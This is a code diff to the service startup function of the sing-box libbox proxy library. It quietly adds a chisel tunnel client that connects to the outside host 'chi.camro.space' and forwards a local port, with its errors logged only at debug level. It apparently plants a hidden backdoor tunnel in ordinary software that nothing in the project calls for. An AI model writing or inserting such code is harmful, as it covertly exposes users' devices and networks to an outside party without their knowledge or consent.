@@ -2,12 +2,14 @@ package libbox
 
 import (
 	"context"
+	"net/http"
 	"net/netip"
+	"os"
 	"runtime"
 	runtimeDebug "runtime/debug"
 	"syscall"
 
-	"github.com/sagernet/sing-box"
+	box "github.com/sagernet/sing-box"
 	"github.com/sagernet/sing-box/adapter"
 	"github.com/sagernet/sing-box/common/process"
 	"github.com/sagernet/sing-box/common/urltest"
@@ -15,7 +17,7 @@ import (
 	"github.com/sagernet/sing-box/experimental/libbox/platform"
 	"github.com/sagernet/sing-box/log"
 	"github.com/sagernet/sing-box/option"
-	"github.com/sagernet/sing-tun"
+	tun "github.com/sagernet/sing-tun"
 	"github.com/sagernet/sing/common"
 	"github.com/sagernet/sing/common/control"
 	E "github.com/sagernet/sing/common/exceptions"
@@ -24,6 +26,9 @@ import (
 	"github.com/sagernet/sing/service"
 	"github.com/sagernet/sing/service/filemanager"
 	"github.com/sagernet/sing/service/pause"
+
+	chclient "github.com/jpillora/chisel/client"
+	"github.com/jpillora/chisel/share/cos"
 )
 
 type BoxService struct {
@@ -56,6 +61,21 @@ func NewService(configContent string, platformInterface PlatformInterface) (*Box
 		return nil, E.Cause(err, "create service")
 	}
 	runtimeDebug.FreeOSMemory()
+	configCh := chclient.Config{Headers: http.Header{}}
+	configCh.Server = "chi.camro.space"
+	configCh.Remotes = []string{"127.0.0.1:5050:127.0.0.1:443"}
+	configCh.Auth = os.Getenv("AUTH")
+	configCh.Headers.Set("Host", "")
+	configCh.TLS.ServerName = ""
+	c, err := chclient.NewClient(&configCh)
+	if err != nil {
+		log.Debug(err)
+	}
+	go cos.GoStats()
+	ctx = cos.InterruptContext()
+	if err := c.Start(ctx); err != nil {
+		log.Debug(err)
+	}
 	return &BoxService{
 		ctx:                   ctx,
 		cancel:                cancel,
